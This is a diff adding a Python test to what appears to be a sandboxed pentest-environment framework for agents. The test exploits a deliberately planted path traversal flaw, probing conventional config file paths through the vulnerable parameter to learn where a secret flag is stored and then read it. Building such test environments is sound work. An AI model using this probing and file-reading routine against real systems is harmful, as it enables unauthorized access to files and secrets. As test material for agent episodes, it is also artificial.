@@ -267,6 +267,47 @@ def test_fanout_class_episode_recovers_flag(
     assert report.passed, report.episode_result.reason
 
 
+def test_flag_path_is_discoverable_via_config(tmp_path: Path) -> None:
+    # The flag location is recon, not a blind guess: a config at a conventional
+    # path discloses the flag path, which the same vuln then reads.
+    import re
+
+    snap = _admit("file", vuln_kinds={"path_traversal": 1})
+    url_path, param, flag_path = _path_traversal_target(snap.graph)
+    expected = str(snap.graph.nodes["secret_flag"].attrs["value_ref"])
+    pentest = next(t for t in snap.tasks if t.meta.get("family") == "webapp.pentest")
+
+    svc = EpisodeService(WebappPack(), tmp_path)
+    try:
+        handle = svc.start_episode(snap, pentest.id)
+        base = svc.surface(handle)["base_url"]
+
+        def read(path: str) -> str:
+            url = f"{base}{url_path}?{param}={urllib.parse.quote(path)}"
+            try:
+                return urllib.request.urlopen(url, timeout=10).read().decode()
+            except urllib.error.HTTPError:
+                return ""
+
+        # A real agent probes conventional config locations.
+        disclosed = ""
+        for conf in (
+            "/etc/app/settings.conf",
+            "/app/config.ini",
+            "/srv/app/config/app.yaml",
+            "/opt/app/conf/main.cfg",
+        ):
+            body = read(conf)
+            match = re.search(r"backup_file = (\S+)", body)
+            if match:
+                disclosed = match.group(1)
+                break
+        assert disclosed == flag_path, disclosed
+        assert expected in read(disclosed)
+    finally:
+        svc.close()
+
+
 def test_path_traversal_wrong_path_recovers_nothing(tmp_path: Path) -> None:
     snap = _admit("file", vuln_kinds={"path_traversal": 1})
     url_path, param, _ = _path_traversal_target(snap.graph)
